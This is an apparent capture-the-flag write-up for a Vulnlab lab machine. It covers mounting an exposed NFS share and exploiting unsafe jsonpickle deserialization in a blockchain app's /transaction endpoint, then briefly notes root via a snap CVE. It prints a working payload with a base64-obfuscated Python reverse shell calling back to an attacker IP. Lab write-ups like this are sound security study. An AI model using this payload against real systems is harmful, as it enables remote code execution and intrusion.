---
title: "Vulnlab - Unchained [Medium]"
publishedAt: 2023-08-20
description: "Vulnlab Writeup"
isPublish: true
---

We can first mount the exposed NFS folder called `backup` to local folder called `mounted`.

```
sudo mount -t nfs -o nfsvers=3 10.10.89.250:/var/nfs/backup ./mounted -o nolock
```

We can see the source code is a project that is a result from this course:
- [https://www.udemy.com/course/build-your-own-proof-of-stake-blockchain](https://www.udemy.com/course/build-your-own-proof-of-stake-blockchain)

Upon reviewing the code that we got from the mount, we can see that the `/transaction` path that tries to `decode` the value of the `transaction`


<img src="/images/Pasted image 20240229101409.png">

Then it goes into the `BlockchainUtils.decode` which has the following code:

<img src="/images/Pasted image 20240229101422.png">

It is notable that the `jsonpickle` direct decoding can be vulnerable to deserialization, so I've crafted the following payload:

```
{
"transaction": "{\"py\/object\": \"__main__.Transaction\", \"syl\": {\"py\/reduce\": [{\"py\/type\": \"subprocess.Popen\"}, {\"py\/tuple\": [{\"py\/tuple\": [\"python3\", \"-c\", \"import base64;exec(base64.b64decode('aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjEwLjguMC4xMDciLDQ0NDQpKTtvcy5kdXAyKHMuZmlsZW5vKCksMCk7IG9zLmR1cDIocy5maWxlbm8oKSwxKTtvcy5kdXAyKHMuZmlsZW5vKCksMik7aW1wb3J0IHB0eTsgcHR5LnNwYXduKCJiYXNoIik='))\"]}]}]}}"
}
```

I did this payload from scratch, but I found an article that has much more efficient payload here:
- [https://medium.com/@0xbughunter/de-serialization-sometimes-pickle-can-be-too-sour-45c930e18b8e](https://medium.com/@0xbughunter/de-serialization-sometimes-pickle-can-be-too-sour-45c930e18b8e)

Nonetheless we can see that we got a connection back.

<img src="/images/Pasted image 20240229165506.png">

After that and after a bit of enumeration we can see that `snap` is in the user folder which kind-a hints that. The vulnerability is `CVE-2021-44731`, we can find a PoC on GitHub, after that we are `root`.